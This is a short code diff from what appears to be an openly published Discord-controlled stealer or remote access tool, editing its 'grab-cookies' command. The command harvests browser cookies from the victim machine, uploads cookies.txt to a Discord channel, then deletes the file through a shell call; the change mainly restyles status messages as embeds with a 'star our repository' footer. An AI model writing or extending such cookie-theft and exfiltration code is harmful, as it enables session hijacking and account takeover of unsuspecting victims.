@@ -143,9 +143,20 @@ class Browsers:
 
 @client.command(name="grab-cookies")
 async def grab_cookies(ctx):
-    await ctx.send('```Grabbing cookies. Please wait...```')
+    await self.get_channel(self.channel_id).send(embed=self.generate_embed(
+        title='🟣 Hold on!',
+        description=f'```{render_text('Grabbing cookies')}...```',
+        color=0xa020f0,
+        footer=['Please ⭐ our repository if you enjoy'],
+        author=[DEFAULT, DEFAULT]))
     grab_cookies()
-    await asyncio.sleep(1)
-    await ctx.send('```Grabbed cookies```', file=discord.File(f'cookies.txt', filename='cookies.txt'))
+    await asyncio.sleep(3)
+    await self.get_channel(self.channel_id).send(embed=self.generate_embed(
+        title='🟢 Success',
+        description=f'```{render_text('Grabbed cookies')} will be sent in next message```',
+        color=0x00ff00,
+        footer=['Please ⭐ our repository if you enjoy'],
+        author=[DEFAULT, DEFAULT]))
+    await ctx.send(file=discord.File(f'cookies.txt', filename='cookies.txt'))
     subprocess.run(f'del cookies.txt', shell=True)
 #</command>
